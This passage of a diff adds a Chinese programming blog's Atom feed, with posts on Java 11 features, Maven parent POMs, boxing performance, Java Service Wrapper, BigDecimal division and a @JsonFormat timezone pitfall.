月25日</td><td>lombda表达式增强，string增加若干方法，纳入httpclient纳入Java的net包，将java9标记废弃的Java EE及CORBA模块移除掉，httpclient正式启用改为java.net.http模块，允许lambda表达式使用var变量,ZGC可扩展的低延迟垃圾收集器</td></tr><tr><td>Java12</td><td>2019年3 月19日</td><td>Shenandoah：一个低停顿垃圾收集器（实验阶段），Switch 表达式扩展，改善 G1 垃圾收集器</td></tr></tbody></table><hr><p>总结下，Java8目前企业使用较多，其次是Java 11，其他版本没有特殊变化。Java10 之后，可以使用Java，像JavaScript一样声明局部变量，极大的简化了开发编写速度。 如下：</p><pre><code>public class TestJava11 {    @Test    public void test1(){        var words = List.of(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;); //初始化list        var tempMap = Map.of(&quot;a&quot;,12,&quot;b&quot;,14); //初始化MAP        var tempSet = Set.of(&quot;1&quot;,&quot;2&quot;,&quot;4&quot;); //初始化set    }}</code></pre><p>Java11 将httpclient正式归于net包中,同时支持异步调用，以及http/2 最新的http协议</p><pre><code class="java"> @Test    public void test() throws Exception {        HttpClient client = HttpClient.newBuilder()                .version(HttpClient.Version.HTTP_1_1)                .followRedirects(HttpClient.Redirect.NORMAL)                .connectTimeout(Duration.ofSeconds(20))               // .proxy(ProxySelector.of(new InetSocketAddress(&quot;www.baidu.com&quot;, 80)))                //.authenticator(Authenticator.getDefault())                .build();        HttpRequest request = HttpRequest.newBuilder()                .uri(URI.create(&quot;https://www.baidu.com&quot;))                .timeout(Duration.ofMinutes(2))                .header(&quot;Content-Type&quot;, &quot;text/html&quot;)                //.POST(HttpRequest.BodyPublishers.ofString(&quot;&quot;, StandardCharsets.UTF_8))                .GET()                .build();        HttpResponse&lt;String&gt; response = client.send(request, HttpResponse.BodyHandlers.ofString());        System.out.println(response.statusCode());        System.out.println(response.body());        client.sendAsync(request, HttpResponse.BodyHandlers.ofString())                .thenApply(HttpResponse::body)                .thenAccept(System.out::println);        System.in.read();    }</code></pre><p>不多说了，后面用起来。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;Java9之后，JCP执行委员会提出将Java的发布频率改为每六个月一次。现在Java已经更新到Java 12了，可是我还停留在Java8上，不得不感慨程序员要保持学习，才能不会被淘汰啊。&lt;/p&gt;
+&lt;hr&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;版本&lt;/th&gt;
+
+      
+    
+    </summary>
+    
+      <category term="技术" scheme="http://www.hasfun.cn/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="Java新特性" scheme="http://www.hasfun.cn/tags/Java%E6%96%B0%E7%89%B9%E6%80%A7/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【在线工具】修炼打字速度</title>
+    <link href="http://www.hasfun.cn/2019/09/25/typing/"/>
+    <id>http://www.hasfun.cn/2019/09/25/typing/</id>
+    <published>2019-09-25T10:06:05.000Z</published>
+    <updated>2020-11-04T12:32:28.785Z</updated>
+    
+    <content type="html"><![CDATA[<p>闲暇时间，练一把，听着键盘的打字声，很舒畅很悦耳</p><ul><li><a href="https://www.typingclub.com/" target="_blank" rel="noopener">在线修炼打字速度</a></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;闲暇时间，练一把，听着键盘的打字声，很舒畅很悦耳&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.typingclub.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;在线修炼打字速度&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+      
+    
+    </summary>
+    
+      <category term="工具" scheme="http://www.hasfun.cn/categories/%E5%B7%A5%E5%85%B7/"/>
+    
+    
+      <category term="打字" scheme="http://www.hasfun.cn/tags/%E6%89%93%E5%AD%97/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>maven多继承父pom</title>
+    <link href="http://www.hasfun.cn/2019/09/23/maven/"/>
+    <id>http://www.hasfun.cn/2019/09/23/maven/</id>
+    <published>2019-09-23T10:58:37.000Z</published>
+    <updated>2020-11-04T12:32:28.785Z</updated>
+    
+    <content type="html"><![CDATA[<p>maven工程在管理项目模块关系方面，提供了方便。比如定义一个pom文件，作为父级pom，管理多个模块module，这样的好处，可以用pom管理子模块的jar的版本号，子模块不需要声明jar的版本，假如后期升级jar版本只需要修改pom的版本号即可，配置如下：</p><p>定义父POM</p><pre><code>    &lt;groupId&gt;cn.hasfun&lt;/groupId&gt;    &lt;artifactId&gt;hasfun-pom&lt;/artifactId&gt;    &lt;packaging&gt;pom&lt;/packaging&gt;    &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt;    &lt;name&gt;hasfun-pom&lt;/name&gt;     &lt;modules&gt;        &lt;module&gt;hasfun-common&lt;/module&gt;        &lt;module&gt;hasfun-web&lt;/module&gt;        &lt;module&gt;hasfun-question&lt;/module&gt;        &lt;module&gt;hasfun-db&lt;/module&gt;        &lt;module&gt;hasfun-page&lt;/module&gt;        &lt;module&gt;hcw-netty-springmvc&lt;/module&gt;        &lt;module&gt;hcw-net-framework&lt;/module&gt;        &lt;module&gt;test&lt;/module&gt;    &lt;/modules&gt;    &lt;properties&gt;        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;        &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt;        &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt;        &lt;junit.version&gt;4.12&lt;/junit.version&gt;        &lt;spring-webmvc.version&gt;4.1.4.RELEASE&lt;/spring-webmvc.version&gt;        &lt;spring-context.version&gt;4.1.4.RELEASE&lt;/spring-context.version&gt;        &lt;spring-web.version&gt;4.1.4.RELEASE&lt;/spring-web.version&gt;        &lt;spring-test.version&gt;4.1.4.RELEASE&lt;/spring-test.version&gt;    &lt;/properties&gt;    &lt;dependencyManagement&gt;        &lt;dependencies&gt;            &lt;dependency&gt;                &lt;groupId&gt;junit&lt;/groupId&gt;                &lt;artifactId&gt;junit&lt;/artifactId&gt;                &lt;version&gt;${junit.version}&lt;/version&gt;                &lt;scope&gt;test&lt;/scope&gt;            &lt;/dependency&gt;            &lt;!-- SpringMVC 配置开始--&gt;            &lt;dependency&gt;                &lt;groupId&gt;org.springframework&lt;/groupId&gt;                &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;                &lt;version&gt;${spring-webmvc.version}&lt;/version&gt;            &lt;/dependency&gt;            &lt;dependency&gt;                &lt;groupId&gt;org.springframework&lt;/groupId&gt;                &lt;artifactId&gt;spring-context&lt;/artifactId&gt;                &lt;version&gt;${spring-context.version}&lt;/version&gt;            &lt;/dependency&gt;            &lt;dependency&gt;                &lt;groupId&gt;org.springframework&lt;/groupId&gt;                &lt;artifactId&gt;spring-web&lt;/artifactId&gt;                &lt;version&gt;${spring-web.version}&lt;/version&gt;            &lt;/dependency&gt;            &lt;dependency&gt;                &lt;groupId&gt;org.springframework&lt;/groupId&gt;                &lt;artifactId&gt;spring-test&lt;/artifactId&gt;                &lt;version&gt;${spring-test.version}&lt;/version&gt;            &lt;/dependency&gt;...        &lt;/dependencies&gt;    &lt;/dependencyManagement&gt;</code></pre><p>子模块</p><pre><code>   &lt;parent&gt;        &lt;artifactId&gt;hasfun-pom&lt;/artifactId&gt;        &lt;groupId&gt;cn.hasfun&lt;/groupId&gt;        &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt;    &lt;/parent&gt;    &lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework&lt;/groupId&gt;            &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework&lt;/groupId&gt;            &lt;artifactId&gt;spring-context&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework&lt;/groupId&gt;            &lt;artifactId&gt;spring-web&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework&lt;/groupId&gt;            &lt;artifactId&gt;spring-test&lt;/artifactId&gt;        &lt;/dependency&gt;        ...&lt;/dependencies&gt;</code></pre><p>如上，是定义了一个父pom，与子模块的单继承关系。今天遇到项目里面需要继承公司的底层pom，可是我又想继承自定义pom，又如何实现多继承？父POM，自定义POM继承父POM，子模块再继承自定义pom。今天研究了一下，只需要这样写：</p><pre><code>&lt;dependencyManagement&gt;        &lt;dependencies&gt;            &lt;dependency&gt;                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;                &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt;                &lt;version&gt;1.5.2.RELEASE&lt;/version&gt;                &lt;type&gt;pom&lt;/type&gt;                &lt;scope&gt;import&lt;/scope&gt;            &lt;/dependency&gt;        &lt;/dependencies&gt;&lt;dependencyManagement&gt;</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;maven工程在管理项目模块关系方面，提供了方便。比如定义一个pom文件，作为父级pom，管理多个模块module，这样的好处，可以用pom管理子模块的jar的版本号，子模块不需要声明jar的版本，假如后期升级jar版本只需要修改pom的版本号即可，配置如下：&lt;/p&gt;
+&lt;p
+      
+    
+    </summary>
+    
+      <category term="技术" scheme="http://www.hasfun.cn/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="maven" scheme="http://www.hasfun.cn/tags/maven/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>装箱与拆箱的性能差距</title>
+    <link href="http://www.hasfun.cn/2019/09/05/javabox/"/>
+    <id>http://www.hasfun.cn/2019/09/05/javabox/</id>
+    <published>2019-09-05T11:42:31.000Z</published>
+    <updated>2020-11-04T12:32:28.781Z</updated>
+    
+    <content type="html"><![CDATA[<p>今天读同事的代码，了解到Java拆箱与装箱对性能差距很大。首先，复习下装箱与拆箱的概念，说白了就是包装类型，与基础类型的转换，记得没错的话，这是Java的语法糖。</p><h2 id="装箱"><a href="#装箱" class="headerlink" title="装箱"></a>装箱</h2><pre><code class="java">int i =0 ;Integer j = i; </code></pre><h2 id="拆箱"><a href="#拆箱" class="headerlink" title="拆箱"></a>拆箱</h2><pre><code class="java">Integer i = 0;int j = j;</code></pre><p>下面，分别执行使用装箱与拆箱的程序，和没有装拆箱的程序：</p><pre><code class="java">// 装箱public void boxTest() {        long startTime = System.currentTimeMillis();        Long sum = 0L;        for (long i = 0; i &lt; Integer.MAX_VALUE; i++) {            sum = i;        }        System.out.println(&quot;processing time: &quot; + (System.currentTimeMillis() - startTime) + &quot; ms&quot;);    }</code></pre><p>打印结果：</p><pre><code class="java">processing time: 7808 ms</code></pre><pre><code class="java"> // 不装箱    public void unBoxTest() {        long startTime = System.currentTimeMillis();        long sum = 0L;        for (long i = 0; i &lt; Integer.MAX_VALUE; i++) {            sum = i;        }        System.out.println(&quot;processing time: &quot; + (System.currentTimeMillis() - startTime) + &quot; ms&quot;);    }</code></pre><p>执行结果：</p><pre><code class="java">processing time: 1589 ms</code></pre><p>对比下，惊呆了，可以相差6S。如果追求极致的性能的服务器，这块平日开发的时候，还是可以注意一下，可以优化性能。那么为什么装箱拆箱性能有影响呢，具体原因是，int i = 0;  Integer j = i; 虚拟机会转成  int i =0 ; Integer j = new Integer(i); 那么可想而知，循环体，一直new  Integer(),不断的GC。</p><p>好了，写到这里。今天还是有收获的。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;今天读同事的代码，了解到Java拆箱与装箱对性能差距很大。首先，复习下装箱与拆箱的概念，说白了就是包装类型，与基础类型的转换，记得没错的话，这是Java的语法糖。&lt;/p&gt;
+&lt;h2 id=&quot;装箱&quot;&gt;&lt;a href=&quot;#装箱&quot; class=&quot;headerlink&quot; title=
+      
+    
+    </summary>
+    
+      <category term="技术" scheme="http://www.hasfun.cn/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="装箱与拆箱" scheme="http://www.hasfun.cn/tags/%E8%A3%85%E7%AE%B1%E4%B8%8E%E6%8B%86%E7%AE%B1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>解决服务器宕机重启，Java服务不能自启动的问题</title>
+    <link href="http://www.hasfun.cn/2019/08/21/wrapper-service/"/>
+    <id>http://www.hasfun.cn/2019/08/21/wrapper-service/</id>
+    <published>2019-08-21T07:24:27.000Z</published>
+    <updated>2020-11-04T12:32:28.785Z</updated>
+    
+    <content type="html"><![CDATA[<p>JAVA程序发布的时候，最常见的是会编译成war包，又或者jar包。</p><p>war包是用来发布带网页JSP等的程序，而只是一些Java和配置文件组成的服务程序只需要jar则可以，war部署在Tomcat下面，jar包只要在命令行敲个命令 java -jar demo.jar 则可，多么清晰干脆。命令行操作，带来二个问题</p><pre><code class="java">1:运营人员不小心关闭了命令行，服务则关闭了，这种在window下常见2:当服务器异常重启，Java服务是不能自动重启的，那么怎么解决呢？</code></pre><h3 id="Java-Service-Wrapper"><a href="#Java-Service-Wrapper" class="headerlink" title="Java Service Wrapper"></a>Java Service Wrapper</h3><p><strong>wrapper </strong> 包装的意思，就是将jar包装成windows或者Linux的服务，这样服务器重启也会随着服务器服务一起重启。 </p><p>使用java service wrapper 只需要简单的配置，无需添加任何代码，无侵入性。</p><p><a href="http://wrapper.tanukisoftware.com/doc/english/download.jsp" target="_blank" rel="noopener">Java Service Wrapper</a>  入手很简单，主要有以下几个目录</p><pre><code class="shell">- demo-service  -bin   # 启动demo服务的地方   - run.sh # 启动文件   - wrapper #wrapper系统文件  -lib   # 将demo服务的jar放进来   - wrapper.jar   - libwrapper.so   - logback**  -conf  # 启动demo的一些配置文件     -wrapper.conf  # wrapper配置文件    -logback.xml  # logback日志配置  -logs  # demo服务的日志    - demo-20190821.log  #应用日志    - wrapper-2019-08-21.log #wrapper日志</code></pre><ol><li>run.sh  </li></ol><pre><code class="xml">*******省略***********************# WrapperWRAPPER_CMD=&quot;./wrapper&quot;WRAPPER_CONF=&quot;../conf/wrapper.conf&quot;*******省略***********************</code></pre><p>2：wrapper.conf</p><pre><code class="xml">****wrapper.java.mainclass=org.tanukisoftware.wrapper.WrapperSimpleAppset.default.REPO_DIR=lib  # 设置LIB环境变量set.APP_BASE=.# Java Classpath (include wrapper.jar)  Add class path elements as#  needed starting from 1wrapper.java.classpath.1=lib/wrapper.jarwrapper.java.classpath.2=%REPO_DIR%/* # 指定LIB目录# Java Library Path (location of Wrapper.DLL or libwrapper.so)wrapper.java.library.path.1=lib# Java Bits.  On applicable platforms, tells the JVM to run in 32 or 64-bit mode.wrapper.java.additional.auto_bits=TRUE# Java Additional Parameterswrapper.java.additional.1=-Dlogback.configurationFile=file:conf/logback.xml # 指定日志配置文件# Initial Java Heap Size (in MB)wrapper.java.initmemory=256  # 指定JAVA堆初始化大小# Maximum Java Heap Size (in MB)wrapper.java.maxmemory=1024 # 指定JAVA堆最大内存# Application parameters.  Add parameters as needed starting from 1wrapper.app.parameter.1=cn.hcw.gc.GcExample # 指定main函数#********************************************************************# Wrapper Logging Properties#********************************************************************# Enables Debug output from the Wrapper.# wrapper.debug=TRUE# Format of output for the console.  (See docs for formats)wrapper.console.format=PM# Log Level for console output.  (See docs for log levels)wrapper.console.loglevel=INFO# Log file to use for wrapper output logging.wrapper.logfile=logs/wrapper-YYYYMMDD.log # 指定系统日志格式wrapper.logfile.rollmode=DATE # 指定日志按日期分割# Format of output for the log file.  (See docs for formats)wrapper.logfile.format=LPTM# Log Level for log file output.  (See docs for log levels)wrapper.logfile.loglevel=INFO# Maximum size that the log file will be allowed to grow to before#  the log is rolled. Size is specified in bytes.  The default value#  of 0, disables log rolling.  May abbreviate with the &#39;k&#39; (kb) or#  &#39;m&#39; (mb) suffix.  For example: 10m = 10 megabytes.wrapper.logfile.maxsize=500 # 指定日志文件内存最大大小*******省略***********************# Name of the servicewrapper.name=demo-app-service# Display name of the servicewrapper.displayname=demo-app-service Application# Description of the servicewrapper.description=demo-app-service Description# Service dependencies.  Add dependencies as needed starting from 1wrapper.ntservice.dependency.1=# Mode in which the service is installed.  AUTO_START, DELAY_START or DEMAND_STARTwrapper.ntservice.starttype=AUTO_START# Allow the service to interact with the desktop (Windows NT/2000/XP only).wrapper.ntservice.interactive=FALSE</code></pre><p>以上文件可以参加源码下载运行，至此，Java Service Wrapper 搭建成功，服务可以启动了。</p><p>在Linux下执行命令</p><pre><code class="she">./run.sh start # 启动./run.sh status # 服务运行状态./run.sh stop #停止服务</code></pre><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p><a href="https://github.com/huangchunwu/Java-Service-Wrapper-demo.git" target="_blank" rel="noopener">Java Service Wrapper</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;JAVA程序发布的时候，最常见的是会编译成war包，又或者jar包。&lt;/p&gt;
+&lt;p&gt;war包是用来发布带网页JSP等的程序，而只是一些Java和配置文件组成的服务程序只需要jar则可以，war部署在Tomcat下面，jar包只要在命令行敲个命令 java -jar demo
+      
+    
+    </summary>
+    
+      <category term="技术" scheme="http://www.hasfun.cn/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="棉花糖" scheme="http://www.hasfun.cn/tags/%E6%A3%89%E8%8A%B1%E7%B3%96/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>关于BigDecimal除法的踩坑记录</title>
+    <link href="http://www.hasfun.cn/2019/08/15/decimal/"/>
+    <id>http://www.hasfun.cn/2019/08/15/decimal/</id>
+    <published>2019-08-15T06:56:38.000Z</published>
+    <updated>2020-11-04T12:32:28.781Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近比较忙，很久没有更博了。最近做的一个证券类的猜涨跌活动的项目，涉及到了计算百分比，用到了decimal这个精度比较高的类（float，double计算会丢失精度），程序在测试阶段，出现了错误   <strong>java.lang.ArithmeticException: Non-terminating decimal expansion; no exact representable decimal result</strong>。报错的代码是：</p><pre><code class="java">BigDecimal successRate = new BigDecimal(successTimes).divide(new BigDecimal(totalJoinTimes)).setScale(2,BigDecimal.ROUND_HALF_UP);</code></pre><p>这里就体现你英语水平的地方了，如果报错日志看不懂， 估计你还得去网上搜下此类错误原因，反之，通过报错日志，就能定位到问题，Non-terminating  无止境的，no exact 不是期望的，大概意思就是 除出的结果是个无限循环小数，不是确切的decimal值。所以，用BigDecimal.divide(),要特别注意在方法内，设置保留几位小数，正确的写法是：</p><pre><code class="java">BigDecimal successRate = new BigDecimal(successTimes).divide(new BigDecimal(totalJoinTimes),2,BigDecimal.ROUND_HALF_UP);</code></pre><p>总结一下，其实以前也遇到过这类问题，就是没有及时总结，导致这一次又犯了一次，特此立个flag，以后不会重蹈覆辙。</p><p>这里特别提下：</p><pre><code class="java">在《Effective   Java》这本书中也提到这个原则，float和double只能用来做科学计算或者是工程计算，在商业计算中我们要用java.math.BigDecimal。使用BigDecimal并且一定要用String来够造。</code></pre><p>至于为什么？</p><p>是因为float与double 单精度与双精度小数，比如2.2，在程序里面是十进制的数字，在计算机中是以2进制存储，</p><p>换算成十进制的值，却不会是2.2的。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;最近比较忙，很久没有更博了。最近做的一个证券类的猜涨跌活动的项目，涉及到了计算百分比，用到了decimal这个精度比较高的类（float，double计算会丢失精度），程序在测试阶段，出现了错误   &lt;strong&gt;java.lang.ArithmeticException
+      
+    
+    </summary>
+    
+      <category term="技术" scheme="http://www.hasfun.cn/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="避坑指南" scheme="http://www.hasfun.cn/tags/%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>关于@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm&quot;) 时区差8小时的踩坑记录</title>
+    <link href="http://www.hasfun.cn/2019/07/30/jsonformat/"/>
+    <id>http://www.hasfun.cn/2019/07/30/jsonformat/</id>
+    <published>2019-07-30T07:59:11.000Z</published>
+    <updated>2020-11-04T12:32:28.781Z</updated>
+    
+    <content type="html"><![CDATA[<p>今天遇到有个项目使用jackson的注解@JsonFormat，用于格式化时间输出，eg:</p><pre><code class="java">    @DateTimeFormat(pattern=&quot;yyyy-MM-dd HH:mm&quot;)    @JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm&quot;)    public Date getProBidOpent() {        return proBidOpent;    }</code></pre><p>然而上线后，才发现时间比用户录入的少了8个小时，查询源码发现，JsonFormat默认的时区是国际化本地，而不是东8时区（也就是北京时间），我们看下源码:</p><pre><code class="java">@Target({ElementType.ANNOTATION_TYPE, ElementType.FIELD, ElementType.METHOD, ElementType.PARAMETER,    ElementType.TYPE})@Retention(RetentionPolicy.RUNTIME)@JacksonAnnotationpublic @interface JsonFormat{    ````    public final static String DEFAULT_TIMEZONE = &quot;##default&quot;;            /**         * @since 2.9         */        public Value(String p, Shape sh, String localeStr, String tzStr, Features f,                Boolean lenient)        {            this(p, sh,(localeStr == null || localeStr.length() == 0 || DEFAULT_LOCALE.equals(localeStr)) ?null : new Locale(localeStr),  (tzStr == null || tzStr.length() == 0 || DEFAULT_TIMEZONE.equals(tzStr)) ?                            null : tzStr,                    null, f, lenient);        }}</code></pre><p>默认时区是new Locale(localeStr)。默认转换时区为”GMT”，即格林尼治时间，北京时间是GMT+8</p><p>所以以后使用这个注解要注意避雷，eg：</p><pre><code class="java">@DateTimeFormat(pattern=&quot;yyyy-MM-dd HH:mm&quot;)@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm&quot;,timezone=&quot;GMT+8&quot;)public Date getProBidOpent() {       return proBidOpent;}</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;今天遇到有个项目使用jackson的注解@JsonFormat，用于格式化时间输出，eg:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;java&quot;&gt;
+    @DateTimeFormat(pattern=&amp;quot;yyyy-MM-dd HH:mm&amp;quot;)
+    
+      
+    
+    </summary>
+    
+      <category term="技术" scheme="http://www.hasfun.cn/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="避坑指南" scheme="http://www.hasfun.cn/tags/%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>如何用POI导出100W的数据到EXCEL</title>
+    <link href="http://www.hasfun.cn/2019/07/24/%E5%A6%82%E4%BD%95%E7%94%A8POI%E5%AF%BC%E5%87%BA100W%E7%9A%84%E6%95%B0%E6%8D%AE%E5%88%B0EXCEL/"/>
+    <id>http://www.hasfun.cn/2019/07/24/如何用POI导出100W的数据到EXCEL/</id>
+    <published>2019-07-24T12:13:21.000Z</published>
+    <updated>2020-11-04T12:32:28.785Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>POI导出EXCEL功能，是JAVA程序员入门的功能。一个同事问我，有没有什么好的性能高的方法，可以导出大数据量的Excel方法，据说他们公司之前的同事写的导出Excel，只有一万行记录，导致JVM直接OOM了，看来导出Excel这个功能，还是得重新梳理下，重视一下。</p></blockquote><p>Google了一下，学习了一下excel各个版本，容纳的最大行数与列数还是不一样的。</p><blockquote><p>早期的Office套件使用二进制格式，这里面包括以<code>.doc</code>、<code>.xls</code>、<code>.ppt</code>为后缀的文件；直到2007这个划时代的版本将基于XML的压缩格式作为默认文件格式，也就是相应以<code>.docx</code>、<code>.xlsx</code>、<code>.pptx</code>为后缀的文件</p></blockquote><p>03版二进制Excel能支持的最大行数为65536,2007版本的是1048575。所以对于大数据量，建议使用xlsx格式。</p><p>做Excel的导出，POI就足够了，其他工具也是基于这个来开发的,比如easyExcel。然后操作大文件写入建议使用<code>SXSSFWorkbook</code>  ，顺便提一句大文件写入使用基于SAX的  <code>XSSFReader</code>。</p><p>基于上述原理，我在网上找到了一个开源框架，经过试验，我试着导出100W的数据到Excel，只花了<code>48s</code>，效果很好，源码简单看了一下，就是一些基础的封装，调用SXSSWorkbook操作的Excel，源码如下：</p><p><a href="https://github.com/huangchunwu/huto" target="_blank" rel="noopener">huto的EXCEL大文件导出</a>。</p><p>当然，如果考虑到交互，用户体验好的话，还是避免让用户等待太久时间，建议如下：</p><p>页面发出导出请求，然后服务端收到请求后，异步处理导出，然后服务器将文件导出成功后上传到文件服务器，引导用户去文件服务器列表找。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;blockquote&gt;
+&lt;p&gt;POI导出EXCEL功能，是JAVA程序员入门的功能。一个同事问我，有没有什么好的性能高的方法，可以导出大数据量的Excel方法，据说他们公司之前的同事写的导出Excel，只有一万行记录，导致JVM直接OOM了，看来导出Excel这个功能，还是得重
+      
+    
+    </summary>
+    
+      <category term="技术" scheme="http://www.hasfun.cn/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="POI" scheme="http://www.hasfun.cn/tags/POI/"/>
+    
+      <category term="大数据" scheme="http://www.hasfun.cn/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
+    
+  </entry>
+  
+</feed>
